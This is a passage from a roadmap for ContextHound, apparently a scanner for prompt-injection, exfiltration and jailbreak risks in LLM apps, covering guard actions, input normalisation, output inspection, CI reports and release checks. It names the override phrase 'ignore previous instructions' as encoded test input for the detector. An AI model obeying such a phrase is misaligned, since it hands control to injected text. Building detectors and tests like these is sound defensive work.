1. Actions. Add to GuardConfig: onWarn?(result, findings, messages) and logger?: { warn, info } (default console). After inspection compute the action per finding from the policy (severity -> action, default 'allow'). 'warn' findings call onWarn once per inspection, or logger.warn when onWarn is absent; 'log' findings call logger.info. Add actions: Record<string, GuardAction> (finding id -> action) to InspectResult.
2. Normalisation. Export normalise() from src/scanner/extractor.ts and apply it to the 'raw' prompt in runInspect(); keep 'code-block' unnormalised. Add tests with URL-encoded and octal-escaped "ignore previous instructions".
3. Content shapes. RuntimeMessage.role adds 'developer'. ContentPart accepts 'input_text', 'output_text', 'tool_result' (with nested content: string | ContentPart[]), 'function_call_output' (output: string). extractText() recurses. Add policy.roles?: string[] to limit which roles are inspected.
4. Output inspection. Add guard.inspectOutput(text: string): InspectResult using EXF-002, EXF-007, EXF-008 and a new check that flags the response containing a long verbatim slice of the system message. wrap() gets an optional third argument { inspectOutput?: (result: T) => string } that inspects the returned text and throws HoundBlockedError when the policy blocks.
5. Replace the stale "built-in 86" comment in src/runtime/types.ts.
6. README Library usage: document actions, callbacks, content shapes and output inspection.

Tests in tests/runtime.test.ts for each item.
```

### WP9: Action, cache, PR comment, reports (F19, F20, F23, F28, F30)

```text
Goal: harden CI usage and report metadata.

1. Cache. Add config cachePath (string) and --cache-path. In src/scanner/cache.ts never load a cache file that git tracks (git ls-files --error-unmatch; ignore errors outside git). When writing an entry, take the stat before reading content so a file changed mid-scan is not cached with stale findings. action.yml: pass --no-cache.
2. PR comment author. scripts/action-pr-comment.js only edits comments by github-actions[bot]. Resolve the token's login with GET /user; if that fails (installation tokens), match on the marker plus performed_via_github_app; add optional input comment-author. Truncation in src/report/prComment.ts must close an open <details> and never cut inside a code span.
3. SARIF (src/report/sarif.ts): add originalUriBaseIds { SRCROOT: { uri: "file:///" ... } } or drop uriBaseId consistently; collect rule errors in runScan (return them in ScanResult.ruleErrors) and emit them as toolExecutionNotifications with level "error", setting executionSuccessful false when any occurred; set rule helpUri to the README anchor for the rule family (for example https://github.com/IulianVOStrut/ContextHound#injection-inj); add automationDetails { id: "contexthound/" }.
4. JSON (src/report/json.ts): add tool { name, version } and generatedAt (ISO 8601). Keep existing fields unchanged.
5. Baseline with --diff (src/scanner/baseline.ts): count a baseline finding as resolved only if its file was scanned in this run. Pass the scanned file set into applyBaseline.
6. Escaping (src/report/sanitize.ts): toTerminalSafe and markdownCode render Unicode tag characters (U+E0000 to U+E007F) and variation selectors (U+FE00 to U+FE0F, U+E0100 to U+E01EF) as <U+XXXXX> markers. Handle surrogate pairs.

Tests for each item, including the PR comment module with a mocked fetch.
```

### WP10: release, dependencies, docs, benchmark breadth (F21, F22, F24, F25, F26, F27)

```text
Goal: keep releases consistent and grow test coverage.

1. tests/docs.test.ts: assert every version pin matches package.json: README "npm install -g context-hound@X", README pre-commit "rev: vX", README "Results on X", .pre-commit-hooks.yaml "rev: vX".
2. .github/workflows/release.yml verify job: fail when CHANGELOG.md has no "## [X.Y.Z]" heading for the tag.
3. Dependencies: bump the handlebars override in package.json to ^4.7.10 and refresh package-lock.json; add a Dependabot ignore for chokidar semver-major (chokidar 6 needs Node 22.22) next to the commander entry. Do not merge TypeScript 7 in this change.
4. SECURITY.md: supported versions 2.x; add the threat model for scanning untrusted pull requests (plugins, suppressions, cache, PR comments) once WP1 and WP2 have landed, or describe the current behaviour if they have not.
5. CONTRIBUTING.md: list all 15 rule files and prefixes, and the full checklist (register in src/rules/index.ts, map in src/rules/owasp.ts, positive and negative tests, benchmark fixture and label, npm run docs, lint, test, benchmark).
6. Tests: add direct positive and negative cases for EXF-004 and JBK-003, and a second case for INJ-004, in tests/rules.test.ts.
7. Benchmark: add unsafe fixtures so every rule family has at least one labelled rule, aiming for every rule over time. Add a test in tests/benchmark.test.ts that every rule ID is either in benchmarks/labels.json expected findings or in a new benchmarks/waivers.json with a reason. Start the waiver list with the rules you could not cover, so the test passes and the list shrinks over time. Keep FP at 0%.
```

### Later: v3.0.0 (breaking)

```text
Prepare a 3.0.0 major release:
- engines.node ">=22.22.0"; CI matrix Node 22 and 24 on Linux and Windows; README badge and requirements.
- Upgrade commander to 15 and chokidar to 6; remove their Dependabot ignores; fix any API changes (commander option parsing, chokidar ESM import in src/cli.ts watch mode).
- Make WP1 plugin opt-in and WP2 SARIF suppressions defaults part of the documented breaking changes if they shipped behind flags in 2.x.
- Evaluate TypeScript 7 (Dependabot PR #38): build, declaration maps and ts-jest compatibility; adopt only if all checks pass.
- CHANGELOG "Breaking" section with upgrade steps.
```

---

## 5. Suggested order

1. WP1, WP2, WP3 (P0, small to medium, high impact for CI users).
2. WP5 and WP4.
3. WP6 and WP7 (detection quality; grow the benchmark alongside).
4. WP8, WP9.
5. WP10 continuously; v3.0.0 once Node 20 support is dropped.
